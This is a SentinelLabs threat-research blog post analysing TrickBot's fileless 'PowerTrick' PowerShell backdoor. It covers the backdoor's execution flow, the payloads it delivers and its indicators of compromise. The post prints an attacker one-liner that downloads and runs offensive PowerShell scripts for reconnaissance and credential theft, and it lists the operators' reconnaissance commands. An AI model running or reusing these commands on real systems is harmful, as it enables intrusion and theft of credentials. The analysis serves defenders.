# Reference for threat actor for "Wizard Spider, Gold Blackburn"

**Title**: Top-Tier Russian Organized Cybercrime Group Unveils Fileless Stealthy “PowerTrick” Backdoor for High-Value Targets - SentinelLabs

**Source**: https://labs.sentinelone.com/top-tier-russian-organized-cybercrime-group-unveils-fileless-stealthy-powertrick-backdoor-for-high-value-targets/

## Content

























Top-Tier Russian Organized Cybercrime Group Unveils Fileless Stealthy “PowerTrick” Backdoor for High-Value Targets - SentinelLabs









































































































ABOUT
CVE DATABASE
CONTACT
VISIT SENTINELONE.COM
 

en

English日本語DeutschEspañolFrançaisItalianoDutch한국어 



Get a Demo









 
Back
 



ABOUT
CVE DATABASE
CONTACT
VISIT SENTINELONE.COM
 


Get a Demo

































Crimeware 
Top-Tier Russian Organized Cybercrime Group Unveils Fileless Stealthy “PowerTrick” Backdoor for High-Value Targets 


Vitali Kremez 
/


January 9, 2020





Research by: Vitali Kremez, Joshua Platt and Jason Reaves
Read the Full Report
Executive Summary

The TrickBot cybercrime enterprise actively develops many of its offensive tools such as “PowerTrick” that are leveraged for stealthiness, persistence, and reconnaissance inside infected high-value targets such as financial institutions.
Many of their offensive tools remain undetected for the most part as they are used for a short period of time for targeted post-exploitation purposes such as lateral movement.
Their offensive tooling such as “PowerTrick” is flexible and effective which allows the TrickBot cybercrime actors to leverage them to augment on the fly and stay stealthy as opposed to using larger more open source systems such as PowerShell Empire.
The end-goal of the PowerTrick backdoor and its approach is to bypass restrictions and security controls to adapt to the new age of security controls and exploit the most protected and secure high-value networks.
SentinelLabs developed mock command-and-control panels to allow the institutions to utilize them for testing detections related to “PowerTrick”.

Background
TrickBot is the successor of Dyre [1, 2] which at first was primarily focused on banking fraud in the same manner that Dyre did utilize injection systems. TrickBot has shifted focus to enterprise environments over the years to incorporate many techniques from network profiling, mass data collection, incorporation of lateral traversal exploits. This focus shift is also prevalent in their incorporation of malware and techniques in their tertiary deliveries that are targeting enterprise environments, it is similar to a company where the focus will shift depending on what generates the best revenue. This research follows SentinelLabs discovery of the TrickBot Anchor malware and its nexus to the organized groups and advanced persistent threats.


Graph 1: Image of interactive human network exploitation operator within TrickBot enterprise
PowerTrick Discovery
SentinelLabs research into this PowerShell-based backdoor called “PowerTrick” traces back to the initial infection, we assess with high confidence at least some of the initial PowerTrick infections are being kicked off as a PowerShell task through normal TrickBot infections utilizing a repurposed backconnect module that can accept commands to execute called “NewBCtest”.
Graph 2: Image of PowerTrick execution flow
After the initial stager for the “PowerTrick backdoor” is kicked off, then the actor issues the first command which is to download a larger backdoor. This process is similar to what you see in Powershell Empire with its stager component.
Figure 1: The malware operator issues the first command to download the backdoor.
PowerTrick is designed to execute commands and return the results in Base64 format, the system uses a generated UUID based on computer information as a “botID.”
Figure 2: A unique user ID (UUID) is generated for each bot
The Victim data is then posted back to the controller.
Figure 3: The victim data is posted back to the backend.
PowerTrick is simply designed to execute commands and return results.
Figure 4: Main functionality of PowerTrick
PowerTrick: Actions on Objective
Aside from the PowerTrick backdoor, the criminal actors also commonly utilize other PowerShell utilities to do various tasks. A frequent one utilized was ‘letmein.ps1’ which is a Powershell stager for open-source exploitation framework Metasploit.
iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')); write-output "loaded";iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-SessionGopher.ps1')); write-output "loaded";iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1')); write-output "loaded";iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-VaultCredential.ps1')); write-output "loaded";
The letmein script, in particular, is leveraged frequently to pivot the infection to another framework.

Figure 5: The actors download and execute letmein stager.
It is also used to detonate on other systems after pivoting.
Figure 6: use of network drives to download and execute the letmein stager.
The frequently used commands and actions are as follows:

net view
net use
ping systems
net use with usernames to check permissions on systems
WMIC /node:localhost /Namespace:rootSecurityCenter2 Path AntiVirusProduct Get displayName /Format:List

Once the system and network have been profiled, the actors perform deletion operation and cleanup. They remove any existing files that did not execute properly and move on to a different target of choice or perform lateral movement inside the environment to high-value systems such as financial gateways. The executed tasks included a wide range of utilities such as previously shown Metasploit. Other interesting deliveries will be discussed below:
Graph 3: Summary of PowerTrick Connections to Known Malware
I. TrickBot Anchor Malware
TrickBot Anchor DNS variant [3] is frequently leveraged as an attack framework for enterprise environments.
II. TerraLoader, “more_eggs” Backdoor
TerraLoader variant version “6.0” with more_eggs JavaScript backdoor onboard is a deployed payload, often in addition to the aforementioned Anchor DNS variant on the same systems.
Figure 7: The decoded “more_eggs” backdoor from TerraLoader.
III. Direct Shellcode
Direct shellcode execution is a methodology for payload deployment via a hexlified parameter.
Figure 8: The command is designed to process shellcode as a parameter.
This is something we have observed frequently where the actors will modify or create new delivery systems in order to bypass restrictions and security controls.
Attacker View: How PowerTrick Drops TrickBot Anchor Bot
I. Launch PowerShell
The PowerTrick session is initialized with the following command:

After PowerTrick is successfully executed, a child PowerShell process is created and the attacker issues a series of commands in an effort to choose an existing directory on the system.
II. dir command is executed to check the filesystem

III. Execute PowerShell script to download anchor DNS

IV. After the script is executed, the “dir” command is issued again to verify the download was successful.

V. After verifying the download, the file is executed and the scheduled tasks are checked.

VI. The directory is checked again to verify the file successfully self-deleted.

VII. In this particular case, a second PowerShell task is executed via PowerTrick. This file is the more_eggs backdoor described above.

VIII. Once again the directory is checked to verify the download was successful. In each case the existing folder name is used for the file.

IX. After download verification, the file is executed

X. The directory is again checked to verify the file was run and self-deleted.
XI. The following PowerShell command is executed to check for the presence of anti-virus products

XII. Processes checked

XIII. Session is killed

Analyst Note:
The PowerShell task parent window name was OleMainThreadWndName, while the child had the normal name C:windowsSystem32WindowsPowerShellv1.0powershell.exe.

Indicators of Compromise

Anchor (SHA-256): 254e7a333ecee6d486b4f8892fe292fb7ba1471fe500651c1ba3e7ff5c9e03c8
TerraLoader (SHA-256): dcf714bfc35071af9fa04c4329c94e385472388f9715f2da7496b415f1a5aa03
kostunivo[.]com
drive.staticcontent[.]kz
web000aaa[.]info
wizardmagik[.]best
traveldials[.]com
northtracing[.]net
magichere[.]icu
magikorigin[.]me
5[.]9.161.246
192[.]99.38.41
172[.]82.152.15
193[.]42.110.176 

IOCs on GitHub
References
1: https://blog.malwarebytes.com/threat-analysis/2016/10/trick-bot-dyrezas-successor/
2: https://www.fidelissecurity.com/threatgeek/archive/trickbot-we-missed-you-dyre/
3: https://technical.nttsecurity.com/post/102fsp2/trickbot-variant-anchor-dns-communicating-over-dns
Read the Full Report




Backdoor
Cybercrime
fileless
PowerTrick
trickbot




Share

PDF












Vitali Kremez



Vitali Kremez is a strategic advisor for SentinelLabs. He specializes in researching and investigating complex cyberattacks, network intrusions, data breaches, and hacking incidents mainly emanating from the Eastern European cybercriminal ecosystem. He has earned the majority of major certifications available in information technology, information security, and digital forensics fields.























PrevAnchor Project | The Deadly Planeswalker: How The TrickBot Group United High-Tech Crimeware & APTNextNew Snake Ransomware Adds Itself to the Increasing Collection of Golang Crimeware 



Related Posts






SNS Sender | Active Campaigns Unleash Messaging Spam Through the Cloud 

February 15 2024







Exploring FBot  | Python-Based Malware Targeting Cloud and Payment Services 

January 11 2024







Cloudy With a Chance of Credentials | AWS-Targeting Cred Stealer Expands to Azure, GCP 

July 13 2023







Search

Search ...




Sign Up


Get notified when we post new content.



Thanks! Keep an eye out for new content!



Recent PostsSNS Sender | Active Campaigns Unleash Messaging Spam Through the CloudFebruary 15, 2024China’s Cyber Revenge | Why the PRC Fails to Back Its Claims of Western EspionageFebruary 12, 2024ScarCruft | Attackers Gather Strategic Intelligence and Target Cybersecurity ProfessionalsJanuary 22, 2024Labs Categories Crimeware

Security Research

Advanced Persistent Threat

Adversary

LABScon

Security & Intelligence

 









SentinelLabs In the era of interconnectivity, when markets, geographies, and jurisdictions merge in the melting pot of the digital domain, the perils of the threat ecosystem become unparalleled. Crimeware families achieve an unparalleled level of technical sophistication, APT groups are competing in fully-fledged cyber warfare, while once decentralized and scattered threat actors are forming adamant alliances of operating as elite corporate espionage teams.

Recent PostsSNS Sender | Active Campaigns Unleash Messaging Spam Through the CloudFebruary 15, 2024China’s Cyber Revenge | Why the PRC Fails to Back Its Claims of Western EspionageFebruary 12, 2024ScarCruft | Attackers Gather Strategic Intelligence and Target Cybersecurity ProfessionalsJanuary 22, 2024Sign Up


Get notified when we post new content.



Thanks! Keep an eye out for new content!



 







Twitter




LinkedIn









©2024 SentinelOne, All Rights Reserved. 




























 



